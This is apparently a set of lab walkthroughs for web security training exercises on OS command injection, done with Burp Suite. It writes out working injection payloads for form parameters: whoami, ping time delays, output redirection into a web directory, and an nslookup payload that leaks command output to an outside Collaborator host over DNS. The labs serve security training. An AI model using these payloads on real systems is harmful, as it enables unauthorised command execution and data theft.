\nsection{Lab 1: Basic OS Command Injection}

\begin{enumerate}
    \item Intercept a stock-check request using Burp Suite.

    \item Modify the \texttt{productID} parameter by injecting the payload:

          \begin{lstlisting}
;whoami;
    \end{lstlisting}

    \item Forward the modified request and inspect the HTTP response.

    \item Observe the output of \texttt{whoami} to identify the user running the application and confirm OS command injection.
\end{enumerate}

\nsection{Lab 2: Blind OS Command Injection with Time Delays}

\begin{enumerate}
    \item Intercept the feedback submission request using Burp Suite.

    \item Modify the \texttt{email} parameter using either of the following payloads.

          \textbf{Payload 1:}
          \begin{lstlisting}
x||ping+-c+10+127.0.0.1||
    \end{lstlisting}

          \textbf{Payload 2:}
          \begin{lstlisting}
;ping+-c+10+127.0.0.1;
    \end{lstlisting}

    \item Forward the modified request and observe the response time.

    \item Confirm that the response is delayed by approximately 10 seconds, indicating a blind OS command injection vulnerability.
\end{enumerate}

\nsection{Lab 3: Blind OS Command Injection with Output Redirection}

\begin{enumerate}
    \item Intercept the feedback submission request using Burp Suite.

    \item Modify the \texttt{email} parameter using either of the following payloads.

          \textbf{Payload 1:}
          \begin{lstlisting}
||whoami>/var/www/images/output.txt||
    \end{lstlisting}

          \textbf{Payload 2:}
          \begin{lstlisting}
;whoami+>/var/www/images/whoami.txt;
    \end{lstlisting}

    \item Forward the modified request to execute the command and redirect its output to a file in the writable images directory.

    \item Intercept a product image request and modify the \texttt{filename} parameter to match the output filename.

          \textbf{For Payload 1:}
          \begin{lstlisting}
filename=output.txt
    \end{lstlisting}

          \textbf{For Payload 2:}
          \begin{lstlisting}
filename=whoami.txt
    \end{lstlisting}

    \item Forward the request and inspect the response to retrieve the output of \texttt{whoami}.
\end{enumerate}

\vspace{0.5cm}

\nsection{Lab 4: Blind OS Command Injection with Out-of-Band Interaction}

\begin{enumerate}
    \item Intercept the feedback submission request using Burp Suite.

    \item Modify the \texttt{email} parameter with the following payload:

          \begin{lstlisting}
x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
    \end{lstlisting}

    \item Right-click the request and select \texttt{Insert Collaborator payload} to replace \texttt{BURP-COLLABORATOR-SUBDOMAIN} with a valid Burp Collaborator subdomain.

    \item Forward the modified request to trigger a DNS lookup.

    \item Verify that the DNS interaction is received in Burp Collaborator to confirm the blind OS command injection.
\end{enumerate}

\vspace{0.5cm}

\nsection{Lab 5: Blind OS Command Injection with Out-of-Band Data Exfiltration}

\begin{enumerate}
    \item Intercept the feedback submission request using Burp Suite Professional.

    \item Open the Collaborator tab and copy a unique Burp Collaborator payload.

    \item Modify the \texttt{email} parameter using the following payload, replacing the placeholder with your Collaborator subdomain:

          \begin{lstlisting}
||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
        \end{lstlisting}

    \item Forward the modified request to execute the command.

    \item Return to the Collaborator tab and click \texttt{Poll now}. Wait for the DNS interaction if necessary.

    \item Inspect the interaction details and extract the username returned as part of the queried subdomain.

    \item Submit the extracted username to complete the lab.
\end{enumerate}
